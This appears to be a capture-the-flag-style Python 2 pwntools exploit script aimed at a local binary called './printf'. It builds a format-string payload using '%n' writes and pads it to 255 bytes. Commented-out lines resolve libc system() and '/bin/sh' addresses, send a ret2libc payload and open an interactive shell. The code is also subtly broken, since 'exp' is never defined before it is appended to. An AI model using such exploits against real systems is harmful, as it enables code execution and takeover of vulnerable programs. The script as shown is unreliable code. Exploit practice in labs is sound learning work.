from pwn import *
import struct

def padd(s):
    print s+"X"*(255-len(s))

# elf=ELF('printf')
# libc =ELF('libc-d.so.6')

# p=process('./printf')

#plt_wirte=elf.symbols('exit')
#got_wirte=elf.got('write')

#GOT = struct.pack("I",0x8049724)
#HELLO=struct.pack("I",0x80484b4)

exp+="%4$134513843x"
exp+="%7$n"*4
padd(exp)

# print "\n###calculating system() addr and \"/bin/sh\" addr...###"
# libcwrite=libc.symbols['exit'] 
# print "libcExit "+hex(libcwrite)
# libcsystem=libc.symbols['system']
# print "libcsystem "+hex(libcsystem)
# resta=libcwrite-libcsystem
# print(hex(resta))

# system_addr = write_addr - resta

# print 'system_addr= ' + hex(system_addr)
# binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
# print 'binsh_addr= ' + hex(binsh_addr)

# #payload2 = 'a'*140  + p32(system_addr) + p32(vulfun_addr) + p32(binsh_addr)

# print "###sending payload2 ...###"
# p.send(payload2)

# p.interactive()
